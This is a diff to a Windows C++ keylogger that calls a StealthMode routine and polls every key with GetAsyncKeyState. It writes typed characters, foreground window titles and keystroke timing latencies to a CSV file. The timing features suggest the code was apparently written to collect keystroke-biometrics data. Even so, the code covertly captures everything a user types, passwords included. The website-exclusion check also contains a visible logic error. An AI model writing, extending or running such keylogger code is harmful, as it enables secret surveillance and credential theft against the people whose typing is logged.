@@ -3,8 +3,24 @@
 #include <winuser.h>
 #include <fstream>
 #include <chrono>
+#include <thread>
+#include <vector>
+//using namespace std;
 
-using namespace std;
+std::vector<std::string> websites = {
+    "monkeytype",
+    "typeracer",
+    "typeonline",
+    "rapidtyping",
+    "sense-lang",
+    "typingtest",
+    "typing-lessons",
+    "how-to-type",
+    "typingzone",
+    "typrx",
+    "typera",
+    "10fastfingers"
+};
 
 void StealthMode();
 void StartLogging();
@@ -30,27 +46,43 @@ void StealthMode() {
 }
 
 void StartLogging() {
+
+
+    // All features that are extracted
+    // https://imgur.com/kNv5XeQ
+    // The table should look like
+    // Date | Time | Button Clicked | Window | KD1 | KD2 | UDDL | DDDL | UUDL | DUDL
+
+
     char c;
-    string final = "";
+    std::string key1Str = "", key2Str = "", final = "";
     char windowTitle[256] = "";
 
-    cout << "Keylogger Started " << endl;
+    std::cout << "Keylogger Started " << std::endl;
 
-    auto prevTimestamp = std::chrono::high_resolution_clock::now();
+    auto prevTimestamp = std::chrono::system_clock::now();
 
     while (true) {
+start:
         HWND foregroundWindow = GetForegroundWindow();
         GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
+        std::string window = windowTitle;
+
+        for(auto website : websites) {
+            if(window.find(website)) goto start;
+        }
 
         //auto currentTimestamp = std::chrono::high_resolution_clock::now();
 
         uint64_t time = timeSinceEpochMillisec();
-        
+        std::chrono::time_point<std::chrono::high_resolution_clock> key1Up, key2Up, key1Down, key2Down;
         for (c = 8; c <= 222; c++) {
             if (GetAsyncKeyState(c) == -32767) {
 
-                auto currentTimestamp = std::chrono::high_resolution_clock::now();
-                auto interval = std::chrono::duration_cast<std::chrono::milliseconds>(currentTimestamp - prevTimestamp);
+                static bool first = true;
+
+                const auto currentTimestamp = std::chrono::system_clock::now();
+                //auto interval = std::chrono::duration_cast<std::chrono::milliseconds>(currentTimestamp - prevTimestamp);
                 auto timestamp = std::chrono::system_clock::to_time_t(currentTimestamp);
                 std::tm* localTime = std::localtime(&timestamp);
 
@@ -60,25 +92,18 @@ void StartLogging() {
                 char timeStr[9];
                 std::strftime(timeStr, sizeof(timeStr), "%H:%M:%S", localTime);
 
-                ofstream write("Record3.csv", ios::app);
+                std::ofstream write("Record4.csv", std::ios::app);
                 if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                 {
-                    //c += 32;
-                    //write << c << "," << time << "\n";
-                    //write.close();
                     final += (c + 32);
-                    //break;
                 }
 
                 else if ((c > 64) && (c < 91))
                 {
                     final += c;
-                    //write << c << "," << time << "\n";
-                    //write.close();
-                    //break;
                 }
 
-                else 
+                else
                 {
                     switch (c) 
                     {
@@ -164,13 +189,58 @@ void StartLogging() {
                         }
                     }
                 }
-                write << dateStr << ","
-                    << timeStr << ","
-                    << final << ","
-                    << windowTitle << ","
-                    << interval.count() << endl;
 
+                if(first){
+                    key1Str += final;
+                } else {
+                    key2Str += final;
+                }
                 final = "";
+                
+                uint64_t key1 = 0;
+                uint64_t key2 = 0;
+                uint64_t test1 = 0, test2 = 0;
+                //std::chrono::steady_clock::time_point key1Up, key2Up, key1Down, key2Down;// = std::chrono::high_resolution_clock::now();
+                if(first){
+                    key1Down = std::chrono::high_resolution_clock::now();
+                    while(GetAsyncKeyState(c) == -32767){
+                        key1++;
+                        std::this_thread::sleep_for(std::chrono::milliseconds(1));
+                        test1++;
+                    }
+                    key1Up = std::chrono::high_resolution_clock::now();
+                    first = false;
+                } else {
+                    key2Down = std::chrono::high_resolution_clock::now();
+                    while(GetAsyncKeyState(c) == -32767){
+                        key2++;
+                        std::this_thread::sleep_for(std::chrono::milliseconds(1));
+                        test2++;
+                    }
+                    key2Up = std::chrono::high_resolution_clock::now();
+                    first = true;
+                }
+
+                if(first){
+                    auto UDDL = std::chrono::duration_cast<std::chrono::nanoseconds>(key2Down - key1Up);
+                    auto UUDL = std::chrono::duration_cast<std::chrono::nanoseconds>(key2Up - key1Up);
+                    auto DUDL = std::chrono::duration_cast<std::chrono::nanoseconds>(key2Up - key1Down);
+                    auto DDDL = std::chrono::duration_cast<std::chrono::nanoseconds>(key2Down - key1Down);
+                    auto key1 = std::chrono::duration_cast<std::chrono::nanoseconds>(key1Up - key1Down);
+                    auto key2 = std::chrono::duration_cast<std::chrono::nanoseconds>(key2Up - key2Down);
+                    write << dateStr << ","
+                        << timeStr << ","
+                        << key1Str << ","
+                        << key2Str << ","
+                        << windowTitle << ","
+                        << key1.count() << ","
+                        << key2.count() << ","
+                        << UDDL.count() << ","
+                        << DDDL.count() << ","
+                        << UUDL.count() << ","
+                        << DUDL.count() << std::endl;
+                    key1Str = key2Str = "";
+                }
                 prevTimestamp = currentTimestamp;
 
 
